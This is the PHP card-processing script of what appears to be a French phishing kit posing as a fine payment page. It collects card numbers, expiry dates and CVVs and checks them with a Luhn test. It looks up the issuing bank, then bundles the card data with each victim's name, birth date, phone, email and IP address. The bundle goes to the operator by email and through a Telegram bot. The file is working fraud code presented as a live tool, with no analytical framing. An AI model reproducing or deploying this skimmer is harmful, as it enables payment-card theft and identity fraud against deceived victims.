<?php
include('../common/sub_includes.php');
include_once '../config.php';


ob_start();
if(!isset($_SESSION)) {
    session_start();
}

$CC = $_POST['cc'];
$DDE = $_POST['exp'];
$CVV = $_POST['cvv'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    function isValid($num) {
        $num = preg_replace('/[^\d]/', '', $num);
        $sum = '';
    
        for ($i = strlen($num) - 1; $i >= 0; -- $i) {
            $sum .= $i & 1 ? $num[$i] : $num[$i] * 2;
        }
    
        return array_sum(str_split($sum)) % 10 === 0;
    }

    if(isValid($CC) == false)
    {
        header('location: ../paiement.php');
        die();
    }

    $_SESSION['cc']  = $CC;
    $_SESSION['dde']   = $DDE;
    $_SESSION['cvv'] = $CVV;

    $cc = $_SESSION['cc'];
    $bin = substr(str_replace(' ', '', $_POST["cc"]), 0, 6);

    $ch = curl_init();

    $url = "https://lookup.binlist.net/$bin";

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');


    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);


    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }


    curl_close($ch);

    $brand = '';
    $type = '';
    $emoji = '';
    $bank = '';

    $someArray = json_decode($result, true);

    $emoji = $someArray['country']['emoji'];
    $brand = $someArray['brand'];
    $type = $someArray['type'];
    $bank = $someArray['bank']['name'];
    $bank_phone = $someArray['bank']['phone'];
    $subject_title = "[BIN: $bin][$emoji $brand $type]";

    $_SESSION['bin_brand']  = $brand;
    $_SESSION['bin_bank']   = $bank;
    $_SESSION['bin_type'] = $type;

    if($_SESSION['bin_bank'] == null)
    {
        $_SESSION['bin_bank'] = "none";
    }

    if($_SESSION['bin_brand'] == null)
    {
        $_SESSION['bin_brand'] = "none";
    }

    if($_SESSION['bin_type'] == null)
    {
        $_SESSION['bin_type'] = "none";
    }

    $message = '
[🦊] Amende +1 cc [🦊]

💳 Num carte : ' . $_SESSION["cc"] . '
💳 Date Expiration : ' . $_SESSION["dde"] . '
💳 Cryptogramme visuel : ' . $_SESSION["cvv"] . '

🍓 Banque : ' . $_SESSION['bin_bank'] . '
🍓 Niveau de la carte : ' . $_SESSION['bin_brand'] . '
🍓 Type de carte : ' . $_SESSION['bin_type'] . '

[🍛] Tiers Part [🍛] 

👮 Nom : '.$_SESSION['name'].'
🎂 Date de naissance : '.$_SESSION['ddn'].'

📱 Téléphone : '.$_SESSION['phone'].'
💌 Email : '.$_SESSION['email'].'

🛒 Adresse IP : ' . $_SERVER['REMOTE_ADDR'] . '
';


    if ($mail_send == true) {
        $Subject = " 「🍓」+1 Fr3sh Amende CARD from " . $bin . " " . $_SESSION['bin_bank'] . " | " . $_SERVER['REMOTE_ADDR'];
        $head = "From: Amende <info@INUN.bg>";

        mail($rezmail, $Subject, $message, $head);
    }

    if ($tlg_send == true) {
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=" . $rez_chat . "&text=" . urlencode("$message"));
    }
